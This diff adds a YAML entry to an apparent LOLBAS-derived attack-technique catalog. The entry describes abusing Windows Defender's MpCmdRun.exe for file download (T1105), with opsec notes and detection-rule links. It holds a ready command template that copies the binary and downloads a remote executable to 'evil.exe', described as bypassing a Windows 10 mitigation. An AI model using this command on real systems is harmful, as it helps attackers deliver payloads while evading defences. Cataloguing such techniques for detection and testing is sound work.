@@ -1,0 +1,34 @@
+id: lolbas/mpcmdrun/download/1
+type: binary
+platform: windows
+name: MpCmdRun.exe
+phases:
+- command-and-control
+capabilities:
+- file-download
+privilege_required: user
+sources:
+- project: LOLBAS
+  upstream_url: https://lolbas-project.github.io
+  license: GPL-3.0 (verify upstream LICENSE)
+  upstream_version: 9c5e384
+  last_synced: '2026-08-25'
+attack_techniques:
+- T1105
+opsec:
+  noise: high
+  triggers: MpCmdRun storing data into alternate data streams.
+  detection_refs:
+  - https://github.com/SigmaHQ/sigma/blob/159bf4bbc103cc2be3fef4b7c2e7c8b23b63fd10/rules/windows/process_creation/win_susp_mpcmdrun_download.yml
+  - https://github.com/elastic/detection-rules/blob/6ef5c53b0c15e344f0f2d1649941391aea6fa253/rules/windows/command_and_control_remote_file_copy_mpcmdrun.toml
+commands:
+- template: copy "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe" C:\Users\Public\Downloads\MP.exe
+    && chdir "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\" && "C:\Users\Public\Downloads\MP.exe"
+    -DownloadFile -url {REMOTEURL:.exe} -path C:\Users\Public\Downloads\evil.exe
+  comment: Download file to specified path. Slashes work as well as dashes (/DownloadFile, /url, /path).
+    Updated version to bypass Windows 10 mitigation.
+references:
+- https://lolbas-project.github.io/lolbas/Binaries/MpCmdRun/
+tags:
+- windows
+- lolbas
